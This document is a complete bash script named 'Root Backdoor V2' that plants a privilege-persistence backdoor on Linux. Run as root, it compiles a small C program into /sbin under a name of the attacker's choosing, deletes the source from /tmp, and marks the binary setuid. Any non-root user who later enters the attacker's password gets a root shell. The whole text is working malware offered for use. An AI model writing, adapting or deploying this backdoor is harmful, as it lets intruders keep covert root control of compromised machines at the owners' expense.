#!/bin/bash
# Root Backdoor V2
# Coded by bleedz

tmp="/tmp/$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1).c"

if [ $(id -u) != 0 ]; then
	echo "uid != 0"
	echo "ca't run this script"
	exit
fi

if [ ! $1 ] || [ ! $2 ]; then
	echo "usage: ./$0 <backdoor_name> <password> <shell>"
	exit
fi

cat > $tmp << EOF
#include<stdio.h>
#include<unistd.h>
#include<string.h>
#include<stdlib.h>
#define PASSWORD "$2"
#define SHELL "$3"

int main(void) {
        char *input;
        input = getpass("PASSWORD: ");
        if(strcmp(PASSWORD, input) == 0) {
                setuid(0);
                setgid(0);
                system(SHELL);
        } else {
                printf("Wrong Password!\n");
	}
}
EOF

if [ -f $tmp ]; then echo "[+] $tmp created"; else echo "[-] can't create $tmp"; exit; fi

if [ -x $(command -v gcc) ]; then echo "[+] gcc found"; else echo "[-] gcc not found"; exit; fi

gcc $tmp -o /sbin/$1
rm -rf $tmp
chmod +x /sbin/$1
chmod +s /sbin/$1

if [ -x /sbin/$1 ]; then echo "[+] /sbin/$1 created and executable"; else echo "[-] /sbin/$1 not created or not executable"; exit; fi

echo "[+] done"
echo -e "\nrun command \"$1\" or \"/sbin/$1\" as non-root user"
